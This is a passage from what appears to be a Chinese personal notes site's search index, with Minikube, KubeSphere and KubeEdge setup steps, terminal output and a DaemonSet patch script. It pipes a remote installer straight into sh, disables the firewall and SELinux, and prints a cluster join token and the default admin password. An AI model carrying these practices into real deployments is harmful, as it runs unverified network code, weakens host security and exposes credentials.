delete","title":"ECS\u90e8\u7f72Minikube"},{"location":"lxc/kubernetes/minikube/minikube/#mac-minikube","text":"\u56e0\u4e3a\u5f88\u591a\u955c\u50cf\u5728\u6d77\u5916\uff0c\u9700\u8981\u5b89\u88c5\u4ee3\u7406\u8f6f\u4ef6 Release \u652f\u6301apple arm64,\u4fee\u590dtrojan\u5bfc\u5165\u95ee\u9898 \u00b7 yanue/V2rayU (github.com) \u8bbe\u7f6e\u597d\u4ee3\u7406\u4e4b\u540e\uff0c\u5728mac\u7ec8\u7aef\u5185\u7c98\u8d34\u5982\u4e0b\u547d\u4ee4 export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080 export NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u4e0b\u8f7d\u5b89\u88c5virtualbox Downloads \u2013 Oracle VM VirtualBox \u5b89\u88c5kubectl Install and Set Up kubectl on macOS | Kubernetes \u5f00\u59cb\u5b89\u88c5minikube $ minikube start --force --driver=virtualbox --kubernetes-version=v1.18.20 --nodes=2 \ud83d\ude04 Darwin 11.6.5 \u4e0a\u7684 minikube v1.26.1 \u2757 minikube skips various validations when --force is supplied; this may lead to unexpected behavior \u2728 \u6839\u636e\u7528\u6237\u914d\u7f6e\u4f7f\u7528 virtualbox \u9a71\u52a8\u7a0b\u5e8f \u2757 Local proxy ignored: not passing HTTP_PROXY=http://127.0.0.1:1087 to docker env. \u2757 Local proxy ignored: not passing HTTPS_PROXY=http://127.0.0.1:1087 to docker env. \ud83d\udc4d Starting control plane node minikube in cluster minikube \ud83d\udd25 Creating virtualbox VM (CPUs=2, Memory=2200MB, Disk=20000MB) ... \u2757 Local proxy ignored: not passing HTTP_PROXY=http://127.0.0.1:1087 to docker env. \u2757 Local proxy ignored: not passing HTTPS_PROXY=http://127.0.0.1:1087 to docker env. \ud83c\udf10 \u627e\u5230\u7684\u7f51\u7edc\u9009\u9879\uff1a \u25aa NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u25aa http_proxy=http://127.0.0.1:1087 \u25aa https_proxy=http://127.0.0.1:1087 \u2757 This VM is having trouble accessing https://k8s.gcr.io \ud83d\udca1 To pull new external images, you may need to configure a proxy: https://minikube.sigs.k8s.io/docs/reference/networking/proxy/ \ud83d\udc33 \u6b63\u5728 Docker 20.10.17 \u4e2d\u51c6\u5907 Kubernetes v1.18.20\u2026 \u25aa env NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u25aa kubelet.cni-conf-dir=/etc/cni/net.mk \u25aa Generating certificates and keys ... \u25aa Booting up control plane ... \u25aa Configuring RBAC rules ... \ud83d\udd17 Configuring CNI (Container Networking Interface) ... \u25aa Using image gcr.io/k8s-minikube/storage-provisioner:v5 \ud83c\udf1f Enabled addons: storage-provisioner, default-storageclass \ud83d\udd0e Verifying Kubernetes components... \ud83d\udc4d Starting worker node minikube-m02 in cluster minikube \ud83d\udd25 Creating virtualbox VM (CPUs=2, Memory=2200MB, Disk=20000MB) ... \u2757 Local proxy ignored: not passing HTTP_PROXY=http://127.0.0.1:1087 to docker env. \u2757 Local proxy ignored: not passing HTTPS_PROXY=http://127.0.0.1:1087 to docker env. \ud83c\udf10 \u627e\u5230\u7684\u7f51\u7edc\u9009\u9879\uff1a \u25aa NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u25aa http_proxy=http://127.0.0.1:1087 \u25aa https_proxy=http://127.0.0.1:1087 \u2757 This VM is having trouble accessing https://k8s.gcr.io \ud83d\udca1 To pull new external images, you may need to configure a proxy: https://minikube.sigs.k8s.io/docs/reference/networking/proxy/ \ud83d\udc33 \u6b63\u5728 Docker 20.10.17 \u4e2d\u51c6\u5907 Kubernetes v1.18.20\u2026 \u25aa env NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \ud83d\udd0e Verifying Kubernetes components... \u2757 /usr/local/bin/kubectl is version 1.25.0, which may have incompatibilites with Kubernetes 1.18.20. \u25aa Want kubectl v1.18.20? Try 'minikube kubectl -- get pods -A' \ud83c\udfc4 Done! kubectl is now configured to use \"minikube\" cluster and \"default\" namespace by default $ kubectl get node -A -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME minikube Ready master 21m v1.18.20 192.168.59.107 <none> Buildroot 2021.02.12 5.10.57 docker://20.10.17 minikube-m02 Ready <none> 20m v1.18.20 192.168.59.108 <none> Buildroot 2021.02.12 5.10.57 docker://20.10.17","title":"Mac \u90e8\u7f72 minikube"},{"location":"lxc/kubesphere/kubesphere/","text":"KubeSphere \u5355\u70b9\u5b89\u88c5 https://kubesphere.com.cn/docs/quick-start/all-in-one-on-linux/ all in one\uff1a \u8bbe\u7f6e4\u6838\uff0c8G\u5185\u5b58\uff0c\u592a\u5c0f\u7684\u8bdd\uff0c\u6709\u7684\u670d\u52a1\u65e0\u6cd5\u542f\u52a8\uff0c\u5173\u95ed\u9632\u706b\u5899\uff0c\u5173\u95edselinux \u4e3b\u673a\u540d KubeSphere\u7248\u672c IP centos7 3.1.1 192.168.70.130 [root@centos7 ~]# yum install yum-utils device-mapper-persistent-data lvm2 openssl socat conntrack ebtables ipset [root@centos7 ~]# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@centos7 ~]# yum list docker-ce --showduplicates | sort -r [root@centos7 ~]# yum install docker-ce-20.10.6 [root@centos7 ~]# systemctl enable --now docker [root@centos7 ~]# export KKZONE=cn [root@centos7 ~]# curl -sfL https://get-kk.kubesphere.io | VERSION=v1.1.1 sh - [root@centos7 ~]# chmod +x kk [root@centos7 ~]#./kk create cluster --with-kubernetes v1.20.4 --with-kubesphere v3.1.1 \u7136\u540e\u4f1a\u63d0\u793a\u8ba9\u5b89\u88c5\u4f9d\u8d56\uff0c\u5ffd\u7565\u5c31\u53ef\u4ee5 \u8f93\u5165yes\uff0c\u7136\u540e\u5c31\u5b8c\u6210\u4e86\u5b89\u88c5 \u542f\u7528\u591a\u96c6\u7fa4\u7ba1\u7406\u529f\u80fd https://v3-1.docs.kubesphere.io/zh/docs/multicluster-management/enable-multicluster/direct-connection/ \u542f\u52a8\u5546\u5e97 https://v3-1.docs.kubesphere.io/zh/docs/pluggable-components/app-store/ \u542f\u52a8Metrics Server\u529f\u80fd https://kubesphere.com.cn/docs/pluggable-components/metrics-server/#%E5%9C%A8%E5%AE%89%E8%A3%85%E5%90%8E%E5%90%AF%E7%94%A8-metrics-server \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4f7f\u7528\u8fb9\u7f18\u8282\u70b9\u529f\u80fd\uff0c\u4e00\u5b9a\u8981\u542f\u52a8Metrics Server\u529f\u80fd\uff0c\u5426\u5219\u8fb9\u7f18\u8282\u70b9\u6ca1\u6709\u76d1\u63a7\u4fe1\u606f \u542f\u7528\u8fb9\u7f18\u8282\u70b9\u529f\u80fd \u5b98\u65b9\u6587\u6863 https://kubesphere.com.cn/docs/pluggable-components/kubeedge/#%E5%9C%A8%E5%AE%89%E8%A3%85%E5%90%8E%E5%90%AF%E7%94%A8-kubeedge \u6211\u662f\u5b89\u88c5\u540e\u542f\u7528 KubeEdge\uff0c\u5176\u4e2d\u6587\u7ae0\u4e2d \u201c\u5c06 kubeedge.cloudCore.cloudHub.advertiseAddress \u7684\u503c\u8bbe\u7f6e\u4e3a\u96c6\u7fa4\u7684\u516c\u5171 IP \u5730\u5740\u6216\u8fb9\u7f18\u8282\u70b9\u53ef\u4ee5\u8bbf\u95ee\u7684 IP \u5730\u5740\u201c \u63d0\u5230\u96c6\u7fa4\u7684\u516c\u5171 IP \u5730\u5740\uff0c\u56e0\u4e3a\u6211\u4f7f\u7528\u7684\u662fall in one\u6a21\u5f0f\uff0c\u53ea\u6709\u4e00\u4e2aIP\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u91cc\u6211\u586b\u5199\u7684\u5c31\u662f192.168.70.130 \u7136\u540e\u5728\u673a\u5668\u4e0a\u6267\u884c [root@centos7 ~] kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath='{.items[0].metadata.name}') -f \u7b49\u5f85\u914d\u7f6e\u66f4\u6539\u5b8c\u6210\uff0c\u51fa\u73b0\u4e0b\u9762\u8fd9\u4e2a\uff0c\u5c31\u8868\u793a\u53d8\u66f4\u5b8c\u6210 ##################################################### ### Welcome to KubeSphere! ### ##################################################### Console: http://192.168.70.130:30880 Account: admin Password: P@88w0rd NOTES\uff1a 1. After you log into the console, please check the monitoring status of service components in \"Cluster Management\". If any service is not ready, please wait patiently until all components are up and running. 2. Please change the default password after login. ##################################################### https://kubesphere.io 2021-09-01 10:35:12 ##################################################### \u5237\u65b0\u9875\u9762\uff0c\u8282\u70b9\u7ba1\u7406\u4e2d\uff0c\u51fa\u73b0\u8fb9\u7f18\u8282\u70b9 \u6dfb\u52a0\u8fb9\u7f18\u8282\u70b9 https://kubesphere.com.cn/docs/installing-on-linux/cluster-operation/add-edge-nodes/ \u65b0\u5efa\u4e00\u53f0\u673a\u5668\uff0c\u6765\u5f53\u505a\u8fb9\u7f18\u8282\u70b9\uff0c\u5173\u95ed\u9632\u706b\u5899\uff0c\u5173\u95edselinux\uff0c\u6211\u8bbe\u7f6e\u7684\u662f4G\uff0c\u53cc\u6838\u673a\u5668 \u4e3b\u673a\u540d IP edgenode 192.168.70.140 \u673a\u5668\u51c6\u5907\u5de5\u4f5c\uff0c\u5b89\u88c5\u4f9d\u8d56 [root@edgenode ~] yum install -y yum-utils device-mapper-persistent-data lvm2 wget [root@edgenode ~] yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@edgenode ~] yum makecache fast [root@edgenode ~] yum install docker-ce-19.03.15-3.el7 docker-ce-cli-19.03.15-3.el7 -y [root@edgenode ~] systemctl enable docker && systemctl restart docker [root@edgenode ~] vi /etc/nsswitch.conf //\u4fee\u6539\u8fd9\u884c hosts: dns files mdns4_minimal [NOTFOUND=return] [root@edgenode ~] echo \"net.ipv4.ip_forward = 1\" >> /etc/sysctl.conf [root@edgenode ~] sysctl -p | grep ip_forward \u7136\u540e\u5c31\u53ef\u4ee5\u5728KubeSphere\u9875\u9762\u4e0a\uff0c\u8282\u70b9\u7ba1\u7406--\u300b\u8fb9\u7f18\u8282\u70b9--\u300b\u6dfb\u52a0\u8282\u70b9\uff0c\u8f93\u5165\u7ed9node\u7684\u540d\u5b57\uff0cnode\u7684IP\u5730\u5740\uff08 \u6ce8\u610f\uff1a\u8fd9\u91cc\u8fd9\u4e2anode\u7684IP\u5730\u5740\uff0c\u4e0d\u8981\u662fnode\u7684\u771f\u5b9eIP\u5730\u5740\uff0c\u8fd9\u4e2aIP\u662f\u4e2a\u865a\u62dfIP\u5730\u5740\uff0c\u7c7b\u4f3cK8S\u7684clusterIP\u4e00\u6837\uff0c\u662f\u4e2a\u5047\u7684IP\uff0c\u4e0b\u9762\u7684\u56fe\u7684IP\u5730\u5740\uff0c\u4e0d\u5e94\u8be5\u662f192.168.70.140\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a1.1.1.1\u6216\u80052.2.2.2\u4e4b\u7c7b\u7684 \uff09\uff0c\u7136\u540e\u590d\u5236\u4e0b\u9762\u7684\u547d\u4ee4 \u4f46\u662f\u9700\u8981\u628a\u547d\u4ee4\u4e2d\u768410000,10001,10002,10004\u4f9d\u6b21\u66f4\u6362\u4e3a30000,30001,30002,30004\uff0c\u5982\u679c\u5b89\u88c5\u5931\u8d25\uff0c\u5c31\u628a--region=zh \u6539\u6210--region=en [root@edgenode ~]# arch=$(uname -m); curl -LO https://kubeedge.pek3b.qingstor.com/bin/v1.6.2/$arch/keadm-v1.6.2-linux-$arch.tar.gz && tar xvf keadm-v1.6.2-linux-$arch.tar.gz && chmod +x keadm && ./keadm join --kubeedge-version=1.6.2 --region=zh --cloudcore-ipport=192.168.70.130:30000 --quicport 30001 --certport 30002 --tunnelport 30004 --edgenode-name edge-1 --edgenode-ip 192.168.70.140 --token 41c74c8e8f86d03b8560eb5be566c62c33eeac1865cdf3a48ad554e9626ef34e.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MzA1NTAwNDZ9.mmR51Ue8rduKViXYqEuQQFyNcYol_IHQIm0K53iOQdM --with-edge-taint % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 38.5M 100 38.5M 0 0 1061k 0 0:00:37 0:00:37 --:--:-- 1034k ./keadm install MQTT service successfully. kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: [Run as service] start to download service file for edgecore [Run as service] success to download service file for edgecore kubeedge-v1.6.2-linux-amd64/ kubeedge-v1.6.2-linux-amd64/edge/ kubeedge-v1.6.2-linux-amd64/edge/edgecore kubeedge-v1.6.2-linux-amd64/cloud/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/csidriver kubeedge-v1.6.2-linux-amd64/cloud/admission/ kubeedge-v1.6.2-linux-amd64/cloud/admission/admission kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/ kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/cloudcore kubeedge-v1.6.2-linux-amd64/version KubeEdge edgecore is running, For logs visit: journalctl -u edgecore.service -b \u670d\u52a1\u7aef\u5237\u65b0\u9875\u9762\uff0c\u5c31\u6dfb\u52a0\u5b8c\u6210\u4e86 \u4e0a\u9762\u6dfb\u52a0\u5b8c\u540e\uff0c\u8fb9\u7f18\u8282\u70b9\u52a0\u5165\u96c6\u7fa4\u540e\uff0c\u90e8\u5206 Pod \u5728\u8c03\u5ea6\u81f3\u8be5\u8fb9\u7f18\u8282\u70b9\u4e0a\u540e\u53ef\u80fd\u4f1a\u4e00\u76f4\u5904\u4e8e Pending \u72b6\u6001\u3002\u7531\u4e8e\u90e8\u5206\u5b88\u62a4\u8fdb\u7a0b\u96c6\uff08\u4f8b\u5982\uff0cCalico\uff09\u6709\u5f3a\u5bb9\u5fcd\u5ea6\uff0c\u5728\u5f53\u524d\u7248\u672c\u4e2d (KubeSphere 3.2.1)\uff0c\u60a8\u9700\u8981\u624b\u52a8 Patch Pod \u4ee5\u9632\u6b62\u5b83\u4eec\u8c03\u5ea6\u81f3\u8be5\u8fb9\u7f18\u8282\u70b9\u3002 #!/bin/bash NodeSelectorPatchJson='{\"spec\":{\"template\":{\"spec\":{\"nodeSelector\":{\"node-role.kubernetes.io/master\": \"\",\"node-role.kubernetes.io/worker\": \"\"}}}}}' NoShedulePatchJson='{\"spec\":{\"template\":{\"spec\":{\"affinity\":{\"nodeAffinity\":{\"requiredDuringSchedulingIgnoredDuringExecution\":{\"nodeSelectorTerms\":[{\"matchExpressions\":[{\"key\":\"node-role.kubernetes.io/edge\",\"operator\":\"DoesNotExist\"}]}]}}}}}}}' edgenode=\"edgenode\" if [ $1 ]; then edgenode=\"$1\" fi namespaces=($(kubectl get pods -A -o wide |egrep -i $edgenode | awk '{print $1}' )) pods=($(kubectl get pods -A -o wide |egrep -i $edgenode | awk '{print $2}' )) length=${#namespaces[@]} for((i=0;i<$length;i++)); do ns=${namespaces[$i]} pod=${pods[$i]} resources=$(kubectl -n $ns describe pod $pod | grep \"Controlled By\" |awk '{print $3}') echo \"Patching for ns:\"${namespaces[$i]}\",resources:\"$resources kubectl -n $ns patch $resources --type merge --patch \"$NoShedulePatchJson\" sleep 1 done \u5176\u5b9e\u4e0a\u9762arch=$(uname -m)\u5f00\u5934\u7684\u547d\u4ee4\uff0c\u662f\u8fde\u63a5[cloudcore]\u670d\u52a1\uff0c\u5728\u9875\u9762\u4e2d\u67e5\u770bcloudcore\u662fnodeport\u7684\u5f62\u5f0f\u63d0\u4f9b\u7684\uff0c\u6620\u5c04\u90fd\u662f30000\u540e\u7684\u7aef\u53e3\u53f7\uff0c\u6240\u4ee5\u9700\u8981\u6539\u4e0b\uff0c\u800c kubeedge.cloudCore.cloudHub.advertiseAddress \u5219\u5e94\u8be5\u662fcloudcore\u670d\u52a1\u7684IP\u5730\u5740\uff0c\u4ed6\u4eec\u662f\u4e00\u4e2aIP\u5730\u5740\uff0call-in-one\u6a21\u5f0f\u4e0b\u53ea\u6709\u4e00\u4e2aIP\u5730\u5740\uff0c\u5982\u679c\u5728\u516c\u7f51\u4e0b\uff0ccloudcore\u5e94\u8be5\u662fSLB\u6216\u8005\u516c\u7f51\u5730\u5740\u624d\u884c \u8fb9\u7f18\u8282\u70b9\u91cd\u7f6e \u5982\u679c\u8be5\u8fb9\u7f18\u8282\u70b9\u9700\u8981\u91cd\u7f6e\uff0c\u9700\u8981\u5982\u4e0b\u64cd\u4f5c\u3002 ./keadm reset yum remove mosquitto rm -rf /var/lib/kubeedge /var/lib/edged /etc/kubeedge/ca /etc/kubeedge/certs rm -rf /etc/systemd/system/edgecore.service \u5220\u9664\u8fb9\u7f18\u8282\u70b9 \u5728\u96c6\u7fa4\u7684\u673a\u5668\u4e0a\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c \u662f\u9875\u9762\u4e0a\u7684\u8fb9\u7f18\u8282\u70b9\u7684\u540d\u5b57 kubectl delete node <edgenode-name> \u8bbe\u7f6e\u516c\u5f00\u96c6\u7fa4\uff0c\u5728\u96c6\u7fa4\u7684 \u96c6\u7fa4\u8bbe\u7f6e \u4e2d\uff0c \u96c6\u7fa4\u53ef\u89c1\u6027 \u4e2d\uff0c \u7f16\u8f91\u53ef\u89c1\u6027 \uff0c\u62c9\u5230\u6700\u5e95\u90e8\uff0c\u6709\u4e2a \u8bbe\u7f6e\u4e3a\u516c\u5f00\u96c6\u7fa4 \u7684\u5f00\u5173\u6253\u5f00\u3002 \u521b\u5efa\u4f01\u4e1a\u7a7a\u95f4\u53ca\u76f8\u5173\u7528\u6237 https://kubesphere.com.cn/docs/quick-start/create-workspace-and-project/ \u5bfc\u5165HELM\u4ed3\u5e93 https://kubesphere.com.cn/docs/workspace-administration/app-repository/import-helm-repository/","title":"KubeSphere\u5b89\u88c5"},{"location":"lxc/kubesphere/kubesphere/#kubesphere","text":"https://kubesphere.com.cn/docs/quick-start/all-in-one-on-linux/ all in one\uff1a \u8bbe\u7f6e4\u6838\uff0c8G\u5185\u5b58\uff0c\u592a\u5c0f\u7684\u8bdd\uff0c\u6709\u7684\u670d\u52a1\u65e0\u6cd5\u542f\u52a8\uff0c\u5173\u95ed\u9632\u706b\u5899\uff0c\u5173\u95edselinux \u4e3b\u673a\u540d KubeSphere\u7248\u672c IP centos7 3.1.1 192.168.70.130 [root@centos7 ~]# yum install yum-utils device-mapper-persistent-data lvm2 openssl socat conntrack ebtables ipset [root@centos7 ~]# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@centos7 ~]# yum list docker-ce --showduplicates | sort -r [root@centos7 ~]# yum install docker-ce-20.10.6 [root@centos7 ~]# systemctl enable --now docker [root@centos7 ~]# export KKZONE=cn [root@centos7 ~]# curl -sfL https://get-kk.kubesphere.io | VERSION=v1.1.1 sh - [root@centos7 ~]# chmod +x kk [root@centos7 ~]#./kk create cluster --with-kubernetes v1.20.4 --with-kubesphere v3.1.1 \u7136\u540e\u4f1a\u63d0\u793a\u8ba9\u5b89\u88c5\u4f9d\u8d56\uff0c\u5ffd\u7565\u5c31\u53ef\u4ee5 \u8f93\u5165yes\uff0c\u7136\u540e\u5c31\u5b8c\u6210\u4e86\u5b89\u88c5 \u542f\u7528\u591a\u96c6\u7fa4\u7ba1\u7406\u529f\u80fd https://v3-1.docs.kubesphere.io/zh/docs/multicluster-management/enable-multicluster/direct-connection/ \u542f\u52a8\u5546\u5e97 https://v3-1.docs.kubesphere.io/zh/docs/pluggable-components/app-store/ \u542f\u52a8Metrics Server\u529f\u80fd https://kubesphere.com.cn/docs/pluggable-components/metrics-server/#%E5%9C%A8%E5%AE%89%E8%A3%85%E5%90%8E%E5%90%AF%E7%94%A8-metrics-server \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4f7f\u7528\u8fb9\u7f18\u8282\u70b9\u529f\u80fd\uff0c\u4e00\u5b9a\u8981\u542f\u52a8Metrics Server\u529f\u80fd\uff0c\u5426\u5219\u8fb9\u7f18\u8282\u70b9\u6ca1\u6709\u76d1\u63a7\u4fe1\u606f","title":"KubeSphere \u5355\u70b9\u5b89\u88c5"},{"location":"lxc/kubesphere/kubesphere/#_1","text":"\u5b98\u65b9\u6587\u6863 https://kubesphere.com.cn/docs/pluggable-components/kubeedge/#%E5%9C%A8%E5%AE%89%E8%A3%85%E5%90%8E%E5%90%AF%E7%94%A8-kubeedge \u6211\u662f\u5b89\u88c5\u540e\u542f\u7528 KubeEdge\uff0c\u5176\u4e2d\u6587\u7ae0\u4e2d \u201c\u5c06 kubeedge.cloudCore.cloudHub.advertiseAddress \u7684\u503c\u8bbe\u7f6e\u4e3a\u96c6\u7fa4\u7684\u516c\u5171 IP \u5730\u5740\u6216\u8fb9\u7f18\u8282\u70b9\u53ef\u4ee5\u8bbf\u95ee\u7684 IP \u5730\u5740\u201c \u63d0\u5230\u96c6\u7fa4\u7684\u516c\u5171 IP \u5730\u5740\uff0c\u56e0\u4e3a\u6211\u4f7f\u7528\u7684\u662fall in one\u6a21\u5f0f\uff0c\u53ea\u6709\u4e00\u4e2aIP\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u91cc\u6211\u586b\u5199\u7684\u5c31\u662f192.168.70.130 \u7136\u540e\u5728\u673a\u5668\u4e0a\u6267\u884c [root@centos7 ~] kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath='{.items[0].metadata.name}') -f \u7b49\u5f85\u914d\u7f6e\u66f4\u6539\u5b8c\u6210\uff0c\u51fa\u73b0\u4e0b\u9762\u8fd9\u4e2a\uff0c\u5c31\u8868\u793a\u53d8\u66f4\u5b8c\u6210 ##################################################### ### Welcome to KubeSphere! ### ##################################################### Console: http://192.168.70.130:30880 Account: admin Password: P@88w0rd NOTES\uff1a 1. After you log into the console, please check the monitoring status of service components in \"Cluster Management\". If any service is not ready, please wait patiently until all components are up and running. 2. Please change the default password after login. ##################################################### https://kubesphere.io 2021-09-01 10:35:12 ##################################################### \u5237\u65b0\u9875\u9762\uff0c\u8282\u70b9\u7ba1\u7406\u4e2d\uff0c\u51fa\u73b0\u8fb9\u7f18\u8282\u70b9","title":"\u542f\u7528\u8fb9\u7f18\u8282\u70b9\u529f\u80fd"},{"location":"lxc/kubesphere/kubesphere/#_2","text":"https://kubesphere.com.cn/docs/installing-on-linux/cluster-operation/add-edge-nodes/ \u65b0\u5efa\u4e00\u53f0\u673a\u5668\uff0c\u6765\u5f53\u505a\u8fb9\u7f18\u8282\u70b9\uff0c\u5173\u95ed\u9632\u706b\u5899\uff0c\u5173\u95edselinux\uff0c\u6211\u8bbe\u7f6e\u7684\u662f4G\uff0c\u53cc\u6838\u673a\u5668 \u4e3b\u673a\u540d IP edgenode 192.168.70.140 \u673a\u5668\u51c6\u5907\u5de5\u4f5c\uff0c\u5b89\u88c5\u4f9d\u8d56 [root@edgenode ~] yum install -y yum-utils device-mapper-persistent-data lvm2 wget [root@edgenode ~] yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@edgenode ~] yum makecache fast [root@edgenode ~] yum install docker-ce-19.03.15-3.el7 docker-ce-cli-19.03.15-3.el7 -y [root@edgenode ~] systemctl enable docker && systemctl restart docker [root@edgenode ~] vi /etc/nsswitch.conf //\u4fee\u6539\u8fd9\u884c hosts: dns files mdns4_minimal [NOTFOUND=return] [root@edgenode ~] echo \"net.ipv4.ip_forward = 1\" >> /etc/sysctl.conf [root@edgenode ~] sysctl -p | grep ip_forward \u7136\u540e\u5c31\u53ef\u4ee5\u5728KubeSphere\u9875\u9762\u4e0a\uff0c\u8282\u70b9\u7ba1\u7406--\u300b\u8fb9\u7f18\u8282\u70b9--\u300b\u6dfb\u52a0\u8282\u70b9\uff0c\u8f93\u5165\u7ed9node\u7684\u540d\u5b57\uff0cnode\u7684IP\u5730\u5740\uff08 \u6ce8\u610f\uff1a\u8fd9\u91cc\u8fd9\u4e2anode\u7684IP\u5730\u5740\uff0c\u4e0d\u8981\u662fnode\u7684\u771f\u5b9eIP\u5730\u5740\uff0c\u8fd9\u4e2aIP\u662f\u4e2a\u865a\u62dfIP\u5730\u5740\uff0c\u7c7b\u4f3cK8S\u7684clusterIP\u4e00\u6837\uff0c\u662f\u4e2a\u5047\u7684IP\uff0c\u4e0b\u9762\u7684\u56fe\u7684IP\u5730\u5740\uff0c\u4e0d\u5e94\u8be5\u662f192.168.70.140\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a1.1.1.1\u6216\u80052.2.2.2\u4e4b\u7c7b\u7684 \uff09\uff0c\u7136\u540e\u590d\u5236\u4e0b\u9762\u7684\u547d\u4ee4 \u4f46\u662f\u9700\u8981\u628a\u547d\u4ee4\u4e2d\u768410000,10001,10002,10004\u4f9d\u6b21\u66f4\u6362\u4e3a30000,30001,30002,30004\uff0c\u5982\u679c\u5b89\u88c5\u5931\u8d25\uff0c\u5c31\u628a--region=zh \u6539\u6210--region=en [root@edgenode ~]# arch=$(uname -m); curl -LO https://kubeedge.pek3b.qingstor.com/bin/v1.6.2/$arch/keadm-v1.6.2-linux-$arch.tar.gz && tar xvf keadm-v1.6.2-linux-$arch.tar.gz && chmod +x keadm && ./keadm join --kubeedge-version=1.6.2 --region=zh --cloudcore-ipport=192.168.70.130:30000 --quicport 30001 --certport 30002 --tunnelport 30004 --edgenode-name edge-1 --edgenode-ip 192.168.70.140 --token 41c74c8e8f86d03b8560eb5be566c62c33eeac1865cdf3a48ad554e9626ef34e.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MzA1NTAwNDZ9.mmR51Ue8rduKViXYqEuQQFyNcYol_IHQIm0K53iOQdM --with-edge-taint % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 38.5M 100 38.5M 0 0 1061k 0 0:00:37 0:00:37 --:--:-- 1034k ./keadm install MQTT service successfully. kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: [Run as service] start to download service file for edgecore [Run as service] success to download service file for edgecore kubeedge-v1.6.2-linux-amd64/ kubeedge-v1.6.2-linux-amd64/edge/ kubeedge-v1.6.2-linux-amd64/edge/edgecore kubeedge-v1.6.2-linux-amd64/cloud/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/csidriver kubeedge-v1.6.2-linux-amd64/cloud/admission/ kubeedge-v1.6.2-linux-amd64/cloud/admission/admission kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/ kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/cloudcore kubeedge-v1.6.2-linux-amd64/version KubeEdge edgecore is running, For logs visit: journalctl -u edgecore.service -b \u670d\u52a1\u7aef\u5237\u65b0\u9875\u9762\uff0c\u5c31\u6dfb\u52a0\u5b8c\u6210\u4e86 \u4e0a\u9762\u6dfb\u52a0\u5b8c\u540e\uff0c\u8fb9\u7f18\u8282\u70b9\u52a0\u5165\u96c6\u7fa4\u540e\uff0c\u90e8\u5206 Pod \u5728\u8c03\u5ea6\u81f3\u8be5\u8fb9\u7f18\u8282\u70b9\u4e0a\u540e\u53ef\u80fd\u4f1a\u4e00\u76f4\u5904\u4e8e Pending \u72b6\u6001\u3002\u7531\u4e8e\u90e8\u5206\u5b88\u62a4\u8fdb\u7a0b\u96c6\uff08\u4f8b\u5982\uff0cCalico\uff09\u6709\u5f3a\u5bb9\u5fcd\u5ea6\uff0c\u5728\u5f53\u524d\u7248\u672c\u4e2d (KubeSphere 3.2.1)\uff0c\u60a8\u9700\u8981\u624b\u52a8 Patch Pod \u4ee5\u9632\u6b62\u5b83\u4eec\u8c03\u5ea6\u81f3\u8be5\u8fb9\u7f18\u8282\u70b9\u3002 #!/bin/bash NodeSelectorPatchJson='{\"spec\":{\"template\":{\"spec\":{\"nodeSelector\":{\"node-role.kubernetes.io/master\": \"\",\"node-role.kubernetes.io/worker\": \"\"}}}}}' NoShedulePatchJson='{\"spec\":{\"template\":{\"spec\":{\"affinity\":{\"nodeAffinity\":{\"requiredDuringSchedulingIgnoredDuringExecution\":{\"nodeSelectorTerms\":[{\"matchExpressions\":[{\"key\":\"node-role.kubernetes.io/edge\",\"operator\":\"DoesNotExist\"}]}]}}}}}}}' edgenode=\"edgenode\" if [ $1 ]; then edgenode=\"$1\" fi namespaces=($(kubectl get pods -A -o wide |egrep -i $edgenode | awk '{print $1}' )) pods=($(kubectl get pods -A -o wide |egrep -i $edgenode | awk '{print $2}' )) length=${#namespaces[@]} for((i=0;i<$length;i++)); do ns=${namespaces[$i]} pod=${pods[$i]} resources=$(kubectl -n $ns describe pod $pod | grep \"Controlled By\" |awk '{print $3}') echo \"Patching for ns:\"${namespaces[$i]}\",resources:\"$resources kubectl -n $ns patch $resources --type merge --patch \"$NoShedulePatchJson\" sleep 1 done 